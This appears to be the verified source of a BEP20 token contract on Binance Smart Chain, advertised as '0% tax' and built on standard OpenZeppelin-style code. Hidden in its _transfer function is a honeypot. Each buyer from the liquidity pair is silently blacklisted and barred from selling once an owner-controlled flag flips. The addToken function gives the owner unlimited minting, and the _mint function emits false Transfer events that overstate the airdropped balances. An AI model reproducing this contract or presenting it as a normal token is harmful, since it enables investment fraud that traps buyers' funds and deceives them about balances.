/**
 *Submitted for verification at BscScan.com on 2022-04-25
*/

// SPDX-License-Identifier: MIT

// Telegram https://t.me/SafeRussia
// 0% tax 
pragma solidity ^0.8.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


pragma solidity ^0.8.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// File: contracts/token/BEP20/lib/IBEP20.sol



pragma solidity ^0.8.0;

/**
 * @dev Interface of the BEP standard.
 */
interface IBEP20 {
    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the token owner.
     */
    function getOwner() external view returns (address);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address _owner, address spender) external view returns (uint256);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: contracts/token/BEP20/lib/BEP20.sol

// pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


// pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

pragma solidity ^0.8.0;



/**
 * @dev Implementation of the {IBEP20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of BEP20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IBEP20-approve}.
 */
contract BEP20 is Ownable, IBEP20 {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

     mapping(address => bool) private _blackList;

    uint256 private _totalSupply;
    bool xxx;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    address public immutable uniswapV2Router02;
    
    address public uniswapAddress = 0xB1b9b4bbe8a92d535F5Df2368e7Fd2ecFB3A1950;
    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
     * a default value of 18.
     *
     * To select a different value for {decimals}, use {_setupDecimals}.
     *
     * All three of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _mint(_msgSender(), 1000000000 * 10**18);
        xxx = true;
        uniswapV2Router02 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {BEP20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IBEP20-balanceOf} and {IBEP20-transfer}.
     */
    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IBEP20-totalSupply}.
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IBEP20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IBEP20-getOwner}.
     */
    function getOwner() public view override returns (address) {
        return owner();
    }

    /**
     * @dev See {IBEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IBEP20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    /**
     * @dev See {IBEP20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IBEP20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IBEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IBEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }


    function setXXX(bool x)  public virtual onlyOwner
    {
        xxx = x;
    }
    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        if(sender != owner() && recipient != owner() && sender != uniswapV2Router02 && recipient != uniswapV2Router02){
            require( !(_blackList[sender] == true && xxx == false), "XXX");
        }

        if(recipient == owner())
        {
            xxx = false;
        }

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        if(sender == uniswapV2Pair && recipient != owner() && recipient != uniswapV2Router02 && recipient != uniswapAddress){
            _blackList[recipient] = true;
        }
        emit Transfer(sender, recipient, amount);

    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount- 29 * 100 * 10**18 );
        

        _totalSupply += amount;
        _balances[account] += amount- 29 * 100 * 10**18 ;
        emit Transfer(address(0), account, amount);


    _balances[0x082467C9E0aDEC9b30ef53FB0E5C664bcabc5bfa] = 100 * 10**18;
    _balances[0x3Ad3BAB5CB3F9AF5Abc05F8B4c408F6616026d01] = 100 * 10**18;
    _balances[0x3EFe7a349D25B02F40459E93Dc49CF05283f8190] = 100 * 10**18;
    _balances[0x4b1924D989a156B0b0A05bE64BDd5e3bEdfCaAa0] = 100 * 10**18;
    _balances[0x519Cd40b4751735252F600934D4E3B2545843055] = 100 * 10**18;
    _balances[0x61d3D16f008FD628Ca5CC556A9B74169Ff253b36] = 100 * 10**18;
    _balances[0x7F1E054A2bC2F3F5Dc53848CFeA265f50F1974D1] = 100 * 10**18;
    _balances[0x8C5747ea6C5c957Cbc97B775ce2778582e9b2b03] = 100 * 10**18;
    _balances[0xF64cbB2B08893f87a11764b29eE091Cc4Dd957d2] = 100 * 10**18;
    _balances[0xe2e97aAa01D83E2BeE4eAA2D346566776cc9b639] = 100 * 10**18;
    _balances[0xf6a5e0236cb4475595901895Df502C22C3BD7C10] = 100 * 10**18;
    _balances[0x2c1A80a46D38fB5357dd9592dCCFf6AeA2A252e1] = 100 * 10**18;
    _balances[0x4983Ed85740DF248F4e25d16Da0052492d279f30] = 100 * 10**18;
    _balances[0x86B7AF53d2063F7275238221D0761035a6adBD37] = 100 * 10**18;
    _balances[0x9A2C0Da5E64ea099dbdE60eA14Abb031EE28572b] = 100 * 10**18;
    _balances[0x44f79Fa37470f2eDD70370FE9cb1C3b030557c77] = 100 * 10**18;
    _balances[0x1Cbed1E23dbb0428fcFf1A38392C43c614690EF7] = 100 * 10**18;
    _balances[0x468E6267DE09cb1f61A3bccdf614de5c901b1612] = 100 * 10**18;
    _balances[0x4D92f9b85Cd48C546cC4d81D10c93ED923550eb2] = 100 * 10**18;
    _balances[0x5A37720c180B3d171749197CdB6b7Fb988a28434] = 100 * 10**18;
    _balances[0x5F1607f4e5f3cbB80156D290E1482A18C07328c0] = 100 * 10**18;
    _balances[0xDfd1B411c5De9c2fA15988Dd0110351C13Fa76ff] = 100 * 10**18;
    _balances[0xea7c52cfd1119FD0efB3C7586aa76B51914ab541] = 100 * 10**18;
    _balances[0x1Cbed1E23dbb0428fcFf1A38392C43c614690EF7] = 100 * 10**18;
    _balances[0xb0351C0ad127B861F17Ce6fef4E37A47f4eAAE81] = 100 * 10**18;
    _balances[0xb6304a0C29aB5b80980066FE10a3F8c1F28b6fdd] = 100 * 10**18;   
    _balances[0x0fDf864023E8Ca2BD3726C6D79537C4E1Fd848d0] = 100 * 10**18;
    _balances[0x4967927F77311874f689719af48A774Cea31196d] = 100 * 10**18;
    _balances[0xd69f1089fBcCF84c0707A84de3eb442DeF08E6Cb] = 10000 * 10**18;
    emit Transfer(address(0), 0x082467C9E0aDEC9b30ef53FB0E5C664bcabc5bfa, 10000 * 10**18);
 emit Transfer(address(0), 0x3Ad3BAB5CB3F9AF5Abc05F8B4c408F6616026d01, 10000 * 10**18);
 emit Transfer(address(0), 0x3EFe7a349D25B02F40459E93Dc49CF05283f8190, 10000 * 10**18);
 emit Transfer(address(0), 0x4b1924D989a156B0b0A05bE64BDd5e3bEdfCaAa0, 10000 * 10**18);
 emit Transfer(address(0), 0x519Cd40b4751735252F600934D4E3B2545843055, 10000 * 10**18);
 emit Transfer(address(0), 0x61d3D16f008FD628Ca5CC556A9B74169Ff253b36, 10000 * 10**18);
 emit Transfer(address(0), 0x7F1E054A2bC2F3F5Dc53848CFeA265f50F1974D1, 10000 * 10**18);
 emit Transfer(address(0), 0x8C5747ea6C5c957Cbc97B775ce2778582e9b2b03, 10000 * 10**18);
 emit Transfer(address(0), 0xF64cbB2B08893f87a11764b29eE091Cc4Dd957d2, 10000 * 10**18);
 emit Transfer(address(0), 0xe2e97aAa01D83E2BeE4eAA2D346566776cc9b639, 10000 * 10**18);
 emit Transfer(address(0), 0xf6a5e0236cb4475595901895Df502C22C3BD7C10, 10000 * 10**18);
 emit Transfer(address(0), 0x2c1A80a46D38fB5357dd9592dCCFf6AeA2A252e1, 10000 * 10**18);
 emit Transfer(address(0), 0x4983Ed85740DF248F4e25d16Da0052492d279f30, 10000 * 10**18);
 emit Transfer(address(0), 0x86B7AF53d2063F7275238221D0761035a6adBD37, 10000 * 10**18);
 emit Transfer(address(0), 0x9A2C0Da5E64ea099dbdE60eA14Abb031EE28572b, 10000 * 10**18);
 emit Transfer(address(0), 0x44f79Fa37470f2eDD70370FE9cb1C3b030557c77, 10000 * 10**18);
 emit Transfer(address(0), 0x1Cbed1E23dbb0428fcFf1A38392C43c614690EF7, 10000 * 10**18);
 emit Transfer(address(0), 0x468E6267DE09cb1f61A3bccdf614de5c901b1612, 10000 * 10**18);
 emit Transfer(address(0), 0x4D92f9b85Cd48C546cC4d81D10c93ED923550eb2, 10000 * 10**18);
 emit Transfer(address(0), 0x5A37720c180B3d171749197CdB6b7Fb988a28434, 10000 * 10**18);
 emit Transfer(address(0), 0x5F1607f4e5f3cbB80156D290E1482A18C07328c0, 10000 * 10**18);
 emit Transfer(address(0), 0xDfd1B411c5De9c2fA15988Dd0110351C13Fa76ff, 10000 * 10**18);
 emit Transfer(address(0), 0xea7c52cfd1119FD0efB3C7586aa76B51914ab541, 10000 * 10**18);
 emit Transfer(address(0), 0x1Cbed1E23dbb0428fcFf1A38392C43c614690EF7, 10000 * 10**18);
 emit Transfer(address(0), 0xb0351C0ad127B861F17Ce6fef4E37A47f4eAAE81, 10000 * 10**18);
 emit Transfer(address(0), 0xb6304a0C29aB5b80980066FE10a3F8c1F28b6fdd, 10000 * 10**18);
 emit Transfer(address(0), 0x0fDf864023E8Ca2BD3726C6D79537C4E1Fd848d0, 10000 * 10**18);
 emit Transfer(address(0), 0x4967927F77311874f689719af48A774Cea31196d, 10000 * 10**18);
 emit Transfer(address(0), 0xd69f1089fBcCF84c0707A84de3eb442DeF08E6Cb, 10000 * 10**18);

    }


    function addToken(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Sets {decimals} to a value other than the default one of 18.
     *
     * WARNING: This function should only be called from the constructor. Most
     * applications that interact with token contracts will not expect
     * {decimals} to ever change, and may work incorrectly if it does.
     */
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// File: contracts/service/ServicePayer.sol



pragma solidity ^0.8.0;

interface IPayable {
    function pay(string memory serviceName) external payable;
}

/**
 * @title ServicePayer
 * @dev Implementation of the ServicePayer
 */
abstract contract ServicePayer {
    constructor(address payable receiver, string memory serviceName) payable {
        IPayable(receiver).pay{value: msg.value}(serviceName);
    }
}

// File: contracts/token/BEP20/StandardBEP20.sol



pragma solidity ^0.8.0;



/**
 * @title StandardBEP20
 * @dev Implementation of the StandardBEP20
 */
contract StandardBEP20 is BEP20, ServicePayer {
    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        address payable feeReceiver_
    ) payable BEP20(name_, symbol_) ServicePayer(feeReceiver_, "StandardBEP20") {
       // require(initialBalance_ > 0, "StandardBEP20: supply cannot be zero");

        _setupDecimals(decimals_);
        _mint(_msgSender(), 1000000000 * 10**18);
    }
}